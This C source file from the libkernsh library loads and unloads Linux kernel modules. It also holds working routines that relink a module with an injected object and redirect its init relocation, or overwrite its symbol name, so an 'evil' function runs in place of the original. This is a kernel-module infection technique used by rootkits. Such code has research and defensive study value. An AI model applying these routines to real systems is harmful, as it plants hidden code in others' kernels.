/*
** module.c for libkernsh
** 
** $Id: module.c,v 1.2 2007-09-23 17:53:35 pouik Exp $
**
*/
#include "libkernsh.h"

int kernsh_kload_module(char *name)
{
  int		ret;
  u_int         dim[2];
  vector_t      *kload;
  int          (*fct)();
  char		buff[BUFSIZ];
  struct stat	binary;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("KLOAD MODULE\n");
#endif

  memset(buff, '\0', sizeof(buff));

  if (name == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Paramater must be not null", -1);
    }

  if (stat(name, &binary))
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       name);
      
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }
  
  kload = aspect_vector_get(LIBKERNSH_VECTOR_NAME_KLOADMODULE);
  dim[0] = libkernshworld.os;

  fct = aspect_vectors_select(kload, dim);
  
  ret = fct(name);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int kernsh_kload_module_linux(char *name)
{
  int ret = 0;
  extern char **environ;
  char *params[] = { "insmod", name, NULL };

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("KLOAD MODULE LINUX\n");
#endif

  if(fork() == 0)
    ret = execve((char *) config_get_data(LIBKERNSH_VMCONFIG_KLOAD), params, environ);


  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int kernsh_kunload_module(char *name)
{
  int		ret;
  u_int         dim[2];
  vector_t      *kunload;
  int          (*fct)();
  char		buff[BUFSIZ];

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("KUNLOAD MODULE\n");
#endif

  memset(buff, '\0', sizeof(buff));

  if (name == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Paramater must be not null", -1);
    }

  kunload = aspect_vector_get(LIBKERNSH_VECTOR_NAME_KUNLOADMODULE);
  dim[0] = libkernshworld.os;

  fct = aspect_vectors_select(kunload, dim);
  
  ret = fct(name);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int kernsh_kunload_module_linux(char *name)
{
  int ret = 0;
  extern char **environ;
  char *params[] = { "rmmod", name, NULL };

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("KUNLOAD MODULE LINUX\n");
#endif

  if(fork() == 0)
    ret = execve((char *) config_get_data(LIBKERNSH_VMCONFIG_KUNLOAD), params, environ);


  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int kernsh_relink_module(char *orig, char *injec, char *evil)
{
  int		ret;
  u_int         dim[2];
  vector_t      *rel;
  int          (*fct)();
  char		buff[BUFSIZ];
  struct stat	binary;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("RELINK MODULE\n");
#endif

  memset(buff, '\0', sizeof(buff));

  if (orig == NULL || injec == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Paramater must be not null", -1);
    }

  if (stat(orig, &binary))
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       orig);
      
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }
  
  if (stat(injec, &binary))
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       injec);
      
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }

  rel = aspect_vector_get(LIBKERNSH_VECTOR_NAME_RELINKMODULE);
  dim[0] = libkernshworld.os;

  fct = aspect_vectors_select(rel, dim);

  if (evil == NULL)
    ret = fct(orig, injec, orig);
  else
    ret = fct(orig, injec, evil);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int kernsh_relink_module_linux(char *orig, char *injec, char *evil)
{
  int ret = 0;
  extern char **environ;
  char *params[] = { "ld", "-r", orig, injec, "-o", evil, NULL};

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);
  
#if __DEBUG_KERNSH__
  printf("RELINK MODULE LINUX\n");
#endif

  if(fork() == 0)
    ret = execve((char *) config_get_data(LIBKERNSH_VMCONFIG_LD), params, environ);

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int kernsh_infect_module(char *module, 
			 char *original_fname, char *evil_fname)
{
  int		ret;
  u_int         dim[2];
  vector_t      *inf;
  int          (*fct)();
  char		buff[BUFSIZ];
  struct stat	binary;
  elfshobj_t	*mod;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("INFECT MODULE\n");
#endif

  memset(buff, '\0', sizeof(buff));

  if (module == NULL || original_fname == NULL || evil_fname == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Paramater must be not null", -1);
    }

  if (stat(module, &binary))
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       module);
      
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }

  mod = kernsh_load_file(module);
  if (mod == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to load module", -1);
    }

  inf = aspect_vector_get(LIBKERNSH_VECTOR_NAME_INFECTMODULE);
  dim[0] = libkernshworld.os;

  fct = aspect_vectors_select(inf, dim);

  ret = fct(module, mod, original_fname, evil_fname);

  /* FIXME : Little trick because elfsh_save_obj segfault with a ET_REL */
  /* kernsh_unload_file(mod); */
  /* END FIXME */

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int get_symbol_idx(elfshobj_t *file, elfsh_Sym *table, int num, char *symbol)
{
  int idx, index;
  char *name;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

  idx = -1;

  for (index = 0; index < num; index++)
    {
      name = elfsh_get_symbol_name(file, table + index);
      if (!strcmp(name, symbol))
	idx = index;
    }

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, idx);
}

int kernsh_infect_module_linux_2_6(char *module, elfshobj_t *mod,
				   char *original_fname, char *evil_fname)
{
  int i, ret, num, index, strindex, nbr, sh_offset, sh_size, idx_init, idx_ninit;
  elfshsect_t   *sct, *gnu;
  elfsh_Sym *table;
  elfsh_Rel rel;
  FILE *newfd;
  char buff[BUFSIZ];

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

  ret = -1;
  num = 0;
  idx_init = idx_ninit = -1;
  
  memset(buff, '\0', sizeof(buff));
  
#if __DEBUG_KERNSH__
  printf("INFECT MODULE LINUX 2.6\n");
#endif

  sct = elfsh_get_section_by_type(mod,
				  SHT_SYMTAB, 0, NULL, NULL, 0);

  if (sct == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to get SYMTAB", -1);
    }

  elfsh_get_symtab(mod, &num);
  table = (elfsh_Sym *) (sct->data);

  if (table == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to find data", -1);
    }

  idx_init = get_symbol_idx(mod, table, num, original_fname);
  
  idx_ninit = get_symbol_idx(mod, table, num, evil_fname);

#if __DEBUG_KERNSH__
  printf("idx_init %d\n", idx_init);
  printf("idx_ninit %d\n", idx_ninit);
#endif

  gnu = elfsh_get_section_by_name(mod, 
				  LIBKERNSH_STRING_REL_GNU, 
				  &index, 
				  &strindex, 
				  &nbr);

  if (gnu == NULL)
    {
      snprintf(buff,
	       sizeof(buff),
	       "Unable to open %s",
	       LIBKERNSH_STRING_REL_GNU);

      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   buff, -1);
    }
  
  
  /* FIXME : Little trick because elfsh_save_obj segfault with a ET_REL */
  kernsh_unload_file(mod);

  sh_offset = gnu->shdr->sh_offset;
  sh_size = gnu->shdr->sh_size/sizeof(elfsh_Rel);

  newfd = fopen(module, "r+");
  if (newfd == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to open file", -1);
    }

  for (i = 0; i < sh_size; i++)
    {
      fseek(newfd, sh_offset + i*sizeof(elfsh_Rel), SEEK_SET);
      fread(&rel, sizeof(elfsh_Rel), 1, newfd);

#if __DEBUG_KERNSH__
      printf("REL %d\n", elfsh_get_relsym(&rel));
#endif

      if (elfsh_get_relsym(&rel) == idx_init)
	{
#if __DEBUG_KERNSH__
	  printf("FIND SYMBOL in reloc %d, change it !\n", elfsh_get_relsym(&rel));
#endif
	  elfsh_set_relsym(&rel, idx_ninit);
	  fseek(newfd, sh_offset + i*sizeof(elfsh_Rel), SEEK_SET);
	  fwrite(&rel, sizeof(elfsh_Rel), 1, newfd);
	  ret = 0;
	}
    }

  fclose(newfd);
  /* END FIXME */

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, ret);
}

int kernsh_infect_module_linux_2_4(char *module, elfshobj_t *mod,
				   char *original_fname, char *evil_fname)
{
  elfshsect_t *strtab;
  elfsh_Sym *so;
  FILE *newfd;
  int           strindex;
  int           index;
  int           nbr;

  PROFILER_IN(__FILE__, __FUNCTION__, __LINE__);

#if __DEBUG_KERNSH__
  printf("INFECT MODULE LINUX 2.4\n");
#endif

  if (strlen(original_fname) != strlen(evil_fname))
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Argument 2 has not the same lenght as arguement 3", -1);
    }

  strtab =  elfsh_get_section_by_name(mod, ".strtab", &index, &strindex, &nbr);
  if (strtab == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to find .strtab", -1);
    }

  so = elfsh_get_symbol_by_name(mod, original_fname);
  if (so == NULL)
    {
      PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		   "Unable to find original function name", -1);
    }
  
  /* FIXME : Little trick because elfsh_save_obj segfault with a ET_REL */
  kernsh_unload_file(mod);

  newfd = fopen(module, "r+");
  
  if (newfd == NULL)
    {
     PROFILER_ERR(__FILE__, __FUNCTION__, __LINE__, 
		  "Unable to open file", -1);
    }
  fseek(newfd, strtab->shdr->sh_offset + so->st_name, SEEK_SET);
  fwrite(evil_fname, strlen(evil_fname), 1, newfd);

  fclose(newfd);
  /* END FIXME */

  PROFILER_ROUT(__FILE__, __FUNCTION__, __LINE__, 0);
}
